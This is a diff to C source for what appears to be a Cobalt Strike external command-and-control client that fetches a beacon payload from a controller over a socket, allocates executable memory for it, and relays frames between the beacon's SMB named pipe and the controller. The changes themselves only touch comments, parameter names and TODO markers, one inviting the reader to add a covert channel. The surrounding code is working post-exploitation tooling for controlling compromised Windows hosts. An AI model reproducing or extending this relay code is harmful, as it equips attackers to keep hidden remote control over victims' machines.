@@ -27,9 +27,10 @@
 /**
  * Creates a socket connection in Windows
  *
- * @param ip A pointer to an array containing the IP address to connect to
- * @param port A pointer to an array containing the port to connect on
+ * @param ip A pointer to a string containing the IP address to connect to
+ * @param port A pointer to a string containing the port to connect on
  * @return A socket handle for the connection
+ * @pre ip and port form a valid IP address and port number
 */
 SOCKET create_socket(char* ip, char* port)
 {
@@ -105,15 +106,16 @@ void sendData(SOCKET sd, const char* data, DWORD len) {
 /**
  * Receives data from our C2 controller to be relayed to the injected beacon
  *
- * @param sd A socket file descriptor
+ * @param sd The socket file descriptor
  * @param buffer Buffer to store data in
- * @param len Length of data to send
+ * @param max unused
  * @return Size of data recieved
 */
 DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
 	DWORD size = 0, total = 0, temp = 0;
 
 	/* read the 4-byte length */
+	/* TODO - will this cause endian issues? */
 	recv(sd, (char *)&size, 4, 0);
 
 	/* read in the result */
@@ -127,21 +129,21 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
 
 
 /**
- * Read a frame from a handle
+ * Reads a frame from the SMB pipe
  * 
- * @param my_handle Handle to beacons SMB pipe
+ * @param smb_handle Handle to beacons SMB pipe
  * @param buffer buffer to read data into
  * @param max unused
  * @return size of data read
  */
-DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
+DWORD read_frame(HANDLE smb_handle, char * buffer, DWORD max) {
 	DWORD size = 0, temp = 0, total = 0;
 	/* read the 4-byte length */
-	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);
+	ReadFile(smb_handle, (char *)&size, 4, &temp, NULL);
 
 	/* read the whole thing in */
 	while (total < size) {
-		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+		ReadFile(smb_handle, buffer + total, size - total, &temp, NULL);
 		total += temp;
 	}
 
@@ -150,16 +152,16 @@ DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
 
 
 /**
- * Write a frame to a file
+ * Writes a frame to the SMB pipe
  * 
- * @param my_handle Handle to beacons SMB pipe
+ * @param smb_handle Handle to beacons SMB pipe
  * @param buffer buffer containing data to send
  * @param length length of data to send
  */
-void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
+void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
 	DWORD wrote = 0;
-	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
-	WriteFile(my_handle, buffer, length, &wrote, NULL);
+	WriteFile(smb_handle, (void *)&length, 4, &wrote, NULL);
+	WriteFile(smb_handle, buffer, length, &wrote, NULL);
 }
 
 
@@ -201,7 +203,7 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	// Recv beacon payload
+	// Allocate data for receiving beacon payload
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
@@ -227,11 +229,12 @@ void main(int argc, char* argv[])
 		// Pipe str (i.e. "mIRC")
 		strcat(pipestr, pipe_str);
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
+		// Create pipe to connect to. 
 		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
 	}
 	printf("Connected to pipe!!\n");
 
-	// Mudge used 1MB max in his example, test this
+	// Mudge used 1MB max in his example
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
@@ -249,8 +252,8 @@ void main(int argc, char* argv[])
 			break;
 		}
 		printf("Recv %d bytes from beacon\n", read_size);
+		//TODO - ADD YOUR COVERT CHANNEL CODE HERE
 		
-
 		sendData(sockfd, buffer, read_size);
 		printf("Sent to TS\n");
 		
